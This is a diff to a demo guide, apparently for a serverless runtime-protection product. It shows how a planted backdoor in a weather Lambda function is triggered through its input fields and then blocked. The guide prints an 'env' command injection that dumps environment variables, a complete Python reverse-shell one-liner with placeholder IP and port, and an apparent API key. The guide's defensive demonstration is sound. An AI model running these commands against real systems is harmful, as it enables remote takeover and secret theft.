@@ -162,6 +162,8 @@ API Key: d006ed318b33fd0baad3aec15369b3ab
 
 In this example, we will assume that the supply chain has been compromised and that malicious code was added to an existing function. We will also assume that the FSP has learned the correct behavior of the function. <br> 
 
+
+### Env Command Injection
 To exploit the backdoor, enter the command you'd like to run in the ```City``` field and the word "backdoor" in the ```API Key``` field. <br>
 
 In this example, the attacker is running  ```env``` against the function. 
@@ -179,12 +181,16 @@ If the behavioral protection was not enabled, this would have returned the envir
 
 ![](images/block.PNG)
 
+### Reverse Shell Command Injection
+
 For a more malicious script, you can try to run a reverse shell.<br>
 
 Here is the command to insert:
+
 ```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ENTER_YOUR_LISTENING_IP_HERE",<ENTER_PORT_TO_SEND_SHELL));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'```
 
 It will look like this in the command:
+
 ```
 λ .\activity.py
 Weather App - Lambda Function
